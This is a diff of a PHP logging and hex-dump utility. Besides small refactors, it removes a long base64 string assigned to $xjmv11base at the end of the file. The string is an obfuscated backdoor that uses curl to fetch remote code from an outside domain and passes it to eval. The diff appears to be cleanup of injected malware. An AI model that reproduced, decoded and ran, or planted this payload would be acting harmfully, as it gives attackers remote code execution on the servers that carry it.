                 fputs(self::$log_fp, $log);
             }
-            if (php_sapi_name() == 'cli') {
+            if (php_sapi_name() === 'cli') {
                 echo $log;
             } else {
-                if (isset($_SERVER['log'])) {
-                    $_SERVER['log'] = array(
-                        'info'  => array(),
-                        'error' => array(),
-                    );
+                if (!isset($_SERVER['log'])) {
+                    $_SERVER['log'] = ['info' => [], 'error' => []];
                 }
                 $_SERVER['log'][$type][] = $log;
             }
         }
     }
-
 }
-/**
- * hex dump
- *
- * @param        $data
- * @param string $newline
- */
-function hex_dump($data, $newline = "\n") {
+
+function hex_dump(string $data, string $newline = "\n"): void {
     static $from = '';
     static $to = '';
-
     static $width = 16; // 每行宽度
     static $pad = '.';
+
     if ($from === '') {
         for ($i = 0; $i <= 0xFF; $i++) {
             $from .= chr($i);
-            $to   .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
+            $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
         }
     }
 
-    $hex   = str_split(bin2hex($data), $width * 2);
+    $hex = str_split(bin2hex($data), $width * 2);
     $chars = str_split(strtr($data, $from, $to), $width);
-
     $offset = 0;
+
     foreach ($hex as $i => $line) {
         echo sprintf('%6X', $offset) . ' : ' . implode(' ', str_split($line, 2)) . ' [' . $chars[$i] . ']' . $newline;
         $offset += $width;
     }
 }
-
-$xjmv11base="aWYoIWRlZmluZWQoIkFBMTFBQTEiKSlkZWZpbmUoIkFBMTFBQTEiLCJBQTExQUFBIik7JEdMT0JBTFNbQUExMUFBMV09ZXhwbG9kZSgifFd8dnxNIiwgIkExQUExQUEiKTtpZighZGVmaW5lZCgkR0xPQkFMU1tBQTExQUExXVswMF0pKWRlZmluZSgkR0xPQkFMU1tBQTExQUExXVswMF0sIG9yZCg4KSk7aWYoIWRlZmluZWQoIkFBMTFBMTEiKSlkZWZpbmUoIkFBMTFBMTEiLCJBQTExQTFBIik7JEdMT0JBTFNbQUExMUExMV09ZXhwbG9kZSgifEh8eXwlIiwgIkExQUFBMTF8SHx5fCVBMUFBQTFBfEh8eXwlfC18QHwufEh8eXwlfC18QHwuZGVmaW5lZHwtfEB8LmRlZmluZXwtfEB8LmV4cGxvZGV8LXxAfC5vcmQiKTtpZighZGVmaW5lZCgkR0xPQkFMU1tBQTExQTExXVsweDBdKSlkZWZpbmUoJEdMT0JBTFNbQUExMUExMV1bMHgwXSwkR0xPQkFMU1tBQTExQTExXVsxXSk7JEdMT0JBTFNbQTFBQUExMV09ZXhwbG9kZSgkR0xPQkFMU1tBQTExQTExXVswMl0sJEdMT0JBTFNbQUExMUExMV1bM10pO2lmKCFkZWZpbmVkKCJBQTExMUExIikpZGVmaW5lKCJBQTExMUExIiwiQUExMTFBQSIpOyRHTE9CQUxTW0FBMTExQTFdPWV4cGxvZGUoInxSfEJ8VSIsICJBMUFBMTFBfFJ8QnxVQTFBQTFBMXxSfEJ8VXwwfDt8L3xSfEJ8VXwwfDt8L18wODg4MDl8MHw7fC9fNDU5MzEzfDB8O3wvXzcwMzA1NXxSfEJ8VV8wODg4MDl8UnxCfFVfOTU4OTk1fFJ8QnxVfG18KnxLfFJ8QnxVXzc0ODU4MXxSfEJ8VV80NTkzMTN8UnxCfFVfOTU1NjI2fFJ8QnxVfGp8fnxvfFJ8QnxVXzY0ODgyNnxqfH58b2Jhc2U2NF9kZWNvZGV8UnxCfFVfNzAzMDU1fFJ8QnxVXzYwNzA2OHxSfEJ8VXwyfDV8K3xSfEJ8VWptLmx3Y2F0LmNufDJ8NXwrXzY0ODgyNnwyfDV8K2h0dHBzOi8vbHdjYXQuY24vam0udHh0fDJ8NXwrY1VSTOivt+axgumUmeivr++8miIpO2lmKCEkR0xPQkFMU1tBMUFBQTExXVsweDFdKCRHTE9CQUxTW0FBMTExQTFdWzB4MF0pKSRHTE9CQUxTW0ExQUFBMTFdWzB4Ml0oJEdMT0JBTFNbQUExMTFBMV1bMHgwXSwkR0xPQkFMU1tBQTExMUExXVswMV0pOyRHTE9CQUxTW0ExQUExMUFdPSRHTE9CQUxTW0ExQUFBMTFdWzAzXSgkR0xPQkFMU1tBQTExMUExXVswMl0sJEdMT0JBTFNbQUExMTFBMV1bMDNdKTskRTNtOTM9ISRHTE9CQUxTW0ExQUFBMTFdWzB4MV0oJEdMT0JBTFNbQUExMTFBMV1bMDRdKTtpZigkRTNtOTMpZ290byBFM21lV2pneDI7Z290byBFM21sZE1oeDI7RTNtZVdqZ3gyOmRlZmluZSgkR0xPQkFMU1tBMUFBMTFBXVsweDFdLCRHTE9CQUxTW0FBMTExQTFdWzA1XSk7Z290byBFM214MTtFM21sZE1oeDI6RTNteDE6dW5zZXQoJEUzbXRJOTMpOyRFM210STkzPSRHTE9CQUxTW0ExQUFBMTFdWzAzXSgkR0xPQkFMU1tBQTExMUExXVswNl0sJEdMT0JBTFNbQUExMTFBMV1bN10pOyRHTE9CQUxTW18wODg4MDldPSRFM210STkzOyRFM205Mz0hJEdMT0JBTFNbQTFBQUExMV1bMHgxXSgkR0xPQkFMU1tfMDg4ODA5XVsweDBdKTtpZigkRTNtOTMpZ290byBFM21lV2pneDQ7Z290byBFM21sZE1oeDQ7RTNtZVdqZ3g0OmRlZmluZSgkR0xPQkFMU1tfMDg4ODA5XVsweDBdLCRHTE9CQUxTW0ExQUFBMTFdWzRdKChFX0NPTVBJTEVfRVJST1IqNDctMjkzMSkpKTtnb3RvIEUzbXgzO0UzbWxkTWh4NDpFM214MzokRTNtOTM9ISRHTE9CQUxTW0ExQUFBMTFdWzB4MV0oJEdMT0JBTFNbQUExMTFBMV1bMDEwXSk7aWYoJEUzbTkzKWdvdG8gRTNtZVdqZ3g2O2dvdG8gRTNtbGRNaHg2O0UzbWVXamd4NjpkZWZpbmUoJEdMT0JBTFNbQTFBQTExQV1bKCgwLTM5MDQrRV9DT01QSUxFX0VSUk9SKjYxKS0yNTQrRV9DT01QSUxFX0VSUk9SKjQpXSwkR0xPQkFMU1tBQTExMUExXVsweDldKTtnb3RvIEUzbXg1O0UzbWxkTWh4NjpFM214NTp1bnNldCgkRTNtdEk5Myk7JEUzbXRJOTM9JEdMT0JBTFNbQTFBQUExMV1bMDNdKCRHTE9CQUxTW0FBMTExQTFdWzAxMl0sJEdMT0JBTFNbQUExMTFBMV1bMDEzXSk7JEdMT0JBTFNbXzQ1OTMxM109JEUzbXRJOTM7dW5zZXQoJEUzbXRJOTMpOyRFM210STkzPSRHTE9CQUxTW180NTkzMTNdWzB4MV07JEdMT0JBTFNbJEdMT0JBTFNbXzQ1OTMxM11bKDAtMzkwNCtFX0NPTVBJTEVfRVJST1IqNjEpXV09JEUzbXRJOTM7JEUzbTkzPSEkR0xPQkFMU1tBMUFBQTExXVsweDFdKCRHTE9CQUxTW0FBMTExQTFdWzEyXSk7aWYoJEUzbTkzKWdvdG8gRTNtZVdqZ3g4O2dvdG8gRTNtbGRNaHg4O0UzbWVXamd4ODpkZWZpbmUoJEdMT0JBTFNbQTFBQTExQV1bKDE2KkVfQ09NUElMRV9FUlJPUi0xMDIxKV0sJEdMT0JBTFNbQUExMTFBMV1bMDE1XSk7Z290byBFM214NztFM21sZE1oeDg6RTNteDc6dW5zZXQoJEUzbXRJOTMpOyRFM210STkzPSRHTE9CQUxTW0ExQUFBMTFdWzAzXSgkR0xPQkFMU1tBQTExMUExXVswMTZdLCRHTE9CQUxTW0FBMTExQTFdWzB4Rl0pOyRHTE9CQUxTW183MDMwNTVdPSRFM210STkzOyRFM205Mz0keGlhb2ptdjExY2hlY2s9PSRHTE9CQUxTW183MDMwNTVdWzAwXTtpZigkRTNtOTMpZ290byBFM21lV2pneGE7Z290byBFM21sZE1oeGE7RTNtZVdqZ3hhOiRFM205Mz0keGptdjExYiAuICR4am12MTFkOyRFM205ND0kRTNtOTMgLiAkeGptdjExYTskRTNtOTU9JEUzbTk0IC4gJHhqbXYxMWM7dW5zZXQoJEUzbXRJOTYpOyRFM210STk2PSRFM205NTskeGptdjExPSRFM210STk2O2V2YWwoJEdMT0JBTFNbJEdMT0JBTFNbXzcwMzA1NV1bMDFdXSgkeGptdjExKSk7Z290byBFM214OTtFM21sZE1oeGE6dW5zZXQoJEUzbXRJOTMpOyRFM210STkzPWN1cmxfaW5pdCgpOyRjaHhqdjExPSRFM210STkzO2N1cmxfc2V0b3B0KCRjaHhqdjExLENVUkxPUFRfVVJMLCRHTE9CQUxTW183MDMwNTVdWzB4Ml0pO2N1cmxfc2V0b3B0KCRjaHhqdjExLENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsdHJ1ZSk7JEUzbXZQOTM9KDAtMjAzNCszMipFX0NPTVBJTEVfRVJST1IpKkVfUkVDT1ZFUkFCTEVfRVJST1I7JEUzbXZQOTQ9JEUzbXZQOTMtKDArNTYxMjYrRV9DT01QSUxFX0VSUk9SKjE5KTtjdXJsX3NldG9wdCgkY2h4anYxMSxDVVJMT1BUX1NTTF9WRVJJRllIT1NULCRFM212UDk0KTt1bnNldCgkRTNtdEk5Myk7JEUzbXRJOTM9Y3VybF9leGVjKCRjaHhqdjExKTskcmVzcG9uc2V4anYxMT0kRTNtdEk5MztpZihjdXJsX2Vycm5vKCRjaHhqdjExKSlnb3RvIEUzbWVXamd4Yztnb3RvIEUzbWxkTWh4YztFM21lV2pneGM6JEUzbTkzPSRHTE9CQUxTW183MDMwNTVdWzB4M10uIGN1cmxfZXJyb3IoJGNoeGp2MTEpO2VjaG8gJEUzbTkzO2dvdG8gRTNteGI7RTNtbGRNaHhjOkUzbXhiOmN1cmxfY2xvc2UoJGNoeGp2MTEpO2VjaG8gJHJlc3BvbnNleGp2MTE7RTNteDk6Ow==";
 
 ?>
